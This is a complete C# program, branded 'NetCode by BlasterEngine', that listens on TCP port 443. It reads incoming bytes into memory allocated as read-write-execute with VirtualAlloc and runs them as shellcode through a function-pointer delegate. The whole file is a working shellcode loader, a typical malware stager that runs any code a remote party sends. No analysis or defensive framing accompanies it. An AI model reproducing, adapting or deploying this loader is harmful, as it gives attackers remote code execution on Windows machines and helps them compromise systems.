using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    static void Main(string[] args)
    {
        Console.WriteLine("Welcome to NetCode!");
        Console.Title = "NetCode by BlasterEngine";
        const string listenIp = "0.0.0.0";
        const int listenPort = 443;

        IPAddress ipAddress = IPAddress.Parse(listenIp);
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, listenPort);

        TcpListener listener = new TcpListener(localEndPoint);
        listener.Start();
        Console.WriteLine($"Listening on TCP port {listenPort}");

        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine("Incoming connection...");

        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[4096];
        int bytesRead = stream.Read(buffer, 0, buffer.Length);

        if (bytesRead > 0)
        {
            Console.WriteLine($"Received shellcode bytes: {bytesRead}");

            IntPtr shellcode = VirtualAlloc(IntPtr.Zero, (uint)bytesRead, 0x3000, 0x40);
            Console.WriteLine($"Allocated memory for shellcode at: 0x{shellcode.ToInt64():X}");

            Marshal.Copy(buffer, 0, shellcode, bytesRead);
            Console.WriteLine($"Copied shellcode to: 0x{shellcode.ToInt64():X}");

            // Cast shellcode as a delegate and execute
            var shellcodeDelegate = (Action)Marshal.GetDelegateForFunctionPointer(shellcode, typeof(Action));
            shellcodeDelegate.Invoke();

            VirtualFree(shellcode, 0, 0x8000);
        }

        stream.Close();
        client.Close();
        listener.Stop();
    }
}
